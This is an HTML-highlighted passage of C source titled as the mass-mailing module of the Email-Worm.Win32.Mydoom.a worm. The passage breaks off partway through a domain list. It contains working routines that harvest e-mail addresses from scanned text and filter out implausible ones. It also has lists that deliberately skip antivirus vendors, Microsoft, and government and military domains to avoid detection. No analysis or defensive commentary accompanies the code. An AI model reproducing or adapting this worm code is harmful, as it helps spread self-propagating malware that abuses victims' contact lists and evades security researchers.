<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Email-Worm.Win32.Mydoom.a - massmail.c.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc7 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc9">#define WIN32_LEAN_AND_MEAN
#include &lt;windows.h&gt;
#include &lt;winsock2.h&gt;
#include "massmail.h"
#include "lib.h"
#include "xdns.h"
#include "scan.h"
#include "msg.h"
#include "xsmtp.h"
</span><span class="sc0">
</span><span class="sc9">#define MAX_DOMAIN 80
</span><span class="sc0">
</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">mailq_t</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc16">volatile</span><span class="sc0"> </span><span class="sc11">massmail_queue</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc16">volatile</span><span class="sc0"> </span><span class="sc11">mmshed_run_threads</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc2">//-----------------------------------------------------------------------------
// E-mail filter
</span><span class="sc0">
</span><span class="sc9">#define isemailchar(c) (isalnum(c) || xstrchr("-._!@",(c)))
#define BEGINEND_INV "-._!"
</span><span class="sc0">
</span><span class="sc9">#define TRIM_END(s) {                                     \
    int i;                                            \
    for (i=lstrlen(s)-1; i&gt;=0; i--) {                 \
        if (isspace(s[i])) continue;              \
        if (xstrchr(BEGINEND_INV, s[i])) continue;\
        if (!isemailchar(s[i])) continue;         \
        if (s[i] == '@') continue;                \
        break;                                    \
    }                                                 \
    s[i+1] = 0;                                       \
}
</span><span class="sc0">
</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">cut_email</span><span class="sc10">(</span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">in_buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">out_buf</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">in_buf</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">in_buf</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">isspace</span><span class="sc10">(</span><span class="sc11">in_buf</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">])</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">!</span><span class="sc11">isemailchar</span><span class="sc10">(</span><span class="sc11">in_buf</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]));</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++);</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(;</span><span class="sc0"> </span><span class="sc11">in_buf</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">xstrchr</span><span class="sc10">(</span><span class="sc11">BEGINEND_INV</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">in_buf</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]);</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++);</span><span class="sc0">

    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">j</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">in_buf</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">in_buf</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'@'</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">isemailchar</span><span class="sc10">(</span><span class="sc11">in_buf</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]))</span><span class="sc0"> </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">out_buf</span><span class="sc10">[</span><span class="sc11">j</span><span class="sc10">++]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">tolower</span><span class="sc10">(</span><span class="sc11">in_buf</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">in_buf</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc7">'@'</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">in_buf</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'@'</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++;</span><span class="sc0">
    </span><span class="sc11">out_buf</span><span class="sc10">[</span><span class="sc11">j</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">TRIM_END</span><span class="sc10">(</span><span class="sc11">out_buf</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">out_buf</span><span class="sc10">[</span><span class="sc11">j</span><span class="sc10">++]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc7">'@'</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(;</span><span class="sc0"> </span><span class="sc11">in_buf</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">isemailchar</span><span class="sc10">(</span><span class="sc11">in_buf</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]))</span><span class="sc0"> </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">out_buf</span><span class="sc10">[</span><span class="sc11">j</span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'.'</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">in_buf</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'.'</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">out_buf</span><span class="sc10">[</span><span class="sc11">j</span><span class="sc10">++]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">tolower</span><span class="sc10">(</span><span class="sc11">in_buf</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">out_buf</span><span class="sc10">[</span><span class="sc11">j</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">TRIM_END</span><span class="sc10">(</span><span class="sc11">out_buf</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">out_buf</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">out_buf</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'@'</span><span class="sc10">))</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">email2parts</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">email</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">username</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">domain</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">email</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc7">'@'</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">email</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">username</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">!</span><span class="sc11">isspace</span><span class="sc10">(</span><span class="sc11">email</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]))</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">username</span><span class="sc10">++=</span><span class="sc11">email</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">username</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">username</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">email</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">domain</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">domain</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">lstrcpy</span><span class="sc10">(</span><span class="sc11">domain</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">email</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">++;</span><span class="sc0"> </span><span class="sc11">email</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">isspace</span><span class="sc10">(</span><span class="sc11">email</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]))</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">domain</span><span class="sc10">++=</span><span class="sc11">email</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc10">*</span><span class="sc11">domain</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc11">email_check2</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">email</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">tld_len</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">usr</span><span class="sc10">[</span><span class="sc4">256</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">dom</span><span class="sc10">[</span><span class="sc4">256</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">email</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">email</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">email</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'@'</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc10">++;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">j</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">email</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">&gt;</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">--)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">email</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'.'</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">email</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'@'</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">tld_len</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">email</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">tld_len</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">tld_len</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">email2parts</span><span class="sc10">(</span><span class="sc11">email</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">usr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">dom</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">usr</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">24</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">dom</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">6</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">42</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">      </span><span class="sc1">/* at least "xxx.xx" */</span><span class="sc0">

    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">dom</span><span class="sc10">)-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">&gt;</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">--)</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">dom</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'.'</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">dom</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'.'</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">usr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">usr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc7">'0'</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">usr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc7">'9'</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc10">++;</span><span class="sc0">
    </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">j</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc4">100</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">/</span><span class="sc0"> </span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">usr</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">usr</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">12</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc4">50</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">usr</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc4">6</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc4">60</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc4">70</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">email_filtdom</span><span class="sc10">(</span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">email</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">nospam_domains</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc6">"avp"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"syma"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"icrosof"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"msn."</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"hotmail"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"panda"</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc6">"sopho"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"borlan"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"inpris"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"example"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"mydomai"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"nodomai"</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc6">"ruslis"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc1">/*vi[ruslis]t */</span><span class="sc0">
        </span><span class="sc6">".gov"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"gov."</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">".mil"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"foo."</span><span class="sc10">,</span><span class="sc0">

</span><span class="sc1">/*"messagelabs", "support" */</span><span class="sc0">

        </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc6">"\n\n\n"</span><span class="sc0">
    </span><span class="sc10">};</span><span class="sc0">
    </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">loyal_list</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc6">"berkeley"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"unix"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"math"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"bsd"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"mit.e"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"gnu"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"fsf."</span><span class="sc10">,</span><span class="sc0">
